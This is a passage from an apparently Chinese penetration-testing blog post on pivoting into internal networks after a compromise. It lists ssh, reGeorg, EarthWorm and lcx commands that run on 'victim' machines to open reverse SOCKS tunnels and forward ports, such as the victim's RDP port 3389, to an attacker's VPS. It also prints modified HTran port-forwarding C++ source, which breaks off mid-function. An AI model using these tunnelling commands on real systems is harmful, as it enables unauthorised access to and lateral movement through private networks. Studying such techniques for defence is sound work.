class="line">-c blowfish|3des|des</span><br><span class="line">请求压缩所有数据.</span><br><span class="line">-C:要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP&#x2F;IP 连接 的数据).</span><br><span class="line">-D port</span><br><span class="line">    指定一个本地机器 &#96;&#96;动态的 应用程序端口转发. </span><br><span class="line">-F configfile</span><br><span class="line">指定ssh指令的配置文件.</span><br><span class="line">-f：后台执行ssh指令.</span><br><span class="line">-g：允许远程主机连接主机的转发端口.</span><br><span class="line">-i identity_file</span><br><span class="line">指定身份文件.</span><br><span class="line">-I smartcard_device</span><br><span class="line">    指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥.</span><br><span class="line">-l login_name</span><br><span class="line">指定连接远程服务器登录用户名.</span><br><span class="line">-L port:host:hostport</span><br><span class="line">    将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">-k：禁止转发 Kerberos 门票和 AFS 令牌. </span><br><span class="line">-m mac_spec</span><br><span class="line">    另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). </span><br><span class="line">-n：把 stdin 重定向到 &#x2F;dev&#x2F;null (实际上防止从 stdin 读取数据). </span><br><span class="line">-N：不执行远程指令,用于转发端口.</span><br><span class="line">-o option</span><br><span class="line">指定配置选项.</span><br><span class="line">-p port</span><br><span class="line">指定远程服务器上的端口.</span><br><span class="line">-q：静默模式.</span><br><span class="line">-s:请求远程系统激活一个子系统.</span><br><span class="line">-R port:host:hostport</span><br><span class="line">    将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">-t:强制分配伪终端.</span><br><span class="line">-T:禁止分配伪终端.</span><br><span class="line">-v:冗详模式.</span><br><span class="line">-X：开启X11转发功能.</span><br><span class="line">-x：关闭X11转发功能.</span><br><span class="line">-y：开启信任X11转发功能.</span><br></pre></td></tr></table></figure><ul><li><p>开启socks代理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 6666 root@1.1.1.1</span><br></pre></td></tr></table></figure><p>输入1.1.1.1机器密码，本地利用proxychains等类似工具连接本地的6666端口的sock5连接即可代理1.1.1.1的网络。</p></li><li><p>控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</p><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 2121:CIP:21 root@BIP</span><br></pre></td></tr></table></figure><p>输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</p></li><li><p>控制A机器，A能够访问B：</p><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 2121:BIP:21 root@hackervps</span><br></pre></td></tr></table></figure><p>输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</p></li></ul><h4 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h4><p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，使用http代理进入内网。</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;reGeorg</span><br></pre></td></tr></table></figure><p>根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示“Georg says, ‘All seems fine’”，说明基本ok。</p><p>然后本地访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythonreGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。</p><h4 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h4><p>官网有使用文档和下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;EarthWorm&#x2F;</span><br></pre></td></tr></table></figure><ul><li><p>受害者机器有外网ip并可直接访问</p><p>把ew传到对方服务器上，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888</span><br></pre></td></tr></table></figure><p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p></li><li><p>控制A机器，A能够访问B，通过A访问B</p><p>在自己外网服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>对方服务器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d yourvpsip -e 8888</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具可通过连接你的外网vps的1080 端口的socks5，即可代理受害者服务器的网络。</p></li><li><p>控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C</p><p>B机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p>A机器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f BIP -g 9999</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p></li><li><p>控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</p><p>自己vps执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>B机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具可通过连接你自己的vps的1080 端口的socks5，即可代理B服务器的网络。</p></li></ul><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><p>lcx是一款轻便的端口转发工具。</p><ul><li><p>反向转发</p><p>外网VPS机器监听：</p><p>1111为转发端口，2222为本机任意未被占用的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 1111 2222</span><br></pre></td></tr></table></figure><p>受害者机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave VPSip 1111 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p></li><li><p>正向转发</p><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 1111 2.2.2.2 8080</span><br></pre></td></tr></table></figure><p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p></li></ul><p>这边只找到源码，我改了一下VS2019可以编译通过</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Usage   : E:\&gt;HTran</span></span><br><span class="line"><span class="comment">*       : ======================== HUC Packet Transmit Tool V1.00 =======================</span></span><br><span class="line"><span class="comment">*       : =========== Code by lion &amp; bkbll, Welcome to [url]http://www.cnhonker.com[/url] ==========</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [Usage of Packet Transmit:]</span></span><br><span class="line"><span class="comment">*       :  HTran -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [option:]</span></span><br><span class="line"><span class="comment">*       :  -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -tran  &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -slave  &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">************************************************************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">SOCKETs1;</span><br><span class="line">SOCKETs2;</span><br><span class="line">&#125;Stu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>;<span class="comment">//对命令行参数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span>;<span class="comment">//监听功能函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span>;<span class="comment">//绑定socket的地址结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span>;<span class="comment">//数据转发函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span>;<span class="comment">//slave函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span>;<span class="comment">//连接服务端</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">version();</span><br><span class="line"><span class="comment">//参数判断</span></span><br><span class="line">WSADATA wsadata;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">1</span>, <span class="number">1</span>), &amp;wsadata);</span><br><span class="line"><span class="keyword">char</span> hostIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> slaveIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">ret = param(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)<span class="comment">//Funlisten</span></span><br><span class="line">&#123;</span><br><span class="line">Funlisten(atoi(argv[<span class="number">2</span>]), atoi(argv[<span class="number">3</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(hostIp, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">strcpy</span>(slaveIp, argv[<span class="number">4</span>]);</span><br><span class="line">slave(argv[<span class="number">2</span>], argv[<span class="number">4</span>], atoi(argv[<span class="number">3</span>]), atoi(argv[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//stricmp==strcmp ignore case忽略大小写</span></span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">4</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-listen&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;Funlisten&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">6</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-slave&quot;</span>) == <span class="number">0</span> &amp;&amp; checkIP(argv[<span class="number">2</span>]) &amp;&amp; checkIP(argv[<span class="number">4</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">version();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*listen 功能模块*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stu_sockstu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定端口到socket并监听</span></span><br><span class="line"><span class="keyword">if</span> (!bindAndFunlisten(sock1, port1) || !bindAndFunlisten(sock2, port2))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//都监听好了接下来……</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> SizeOfAddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting for Client ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">sockaddr_inremoteSockAddr;</span><br><span class="line"><span class="comment">//sock1等待连接</span></span><br><span class="line">SOCKETrecvSock1 = accept(sock1, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; recvSock1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (recvSock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port &quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting another Client on port:&quot;</span> &lt;&lt; port2 &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">SOCKETrecvSock2 = accept(sock2, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; recvSock2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (recvSock2 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> 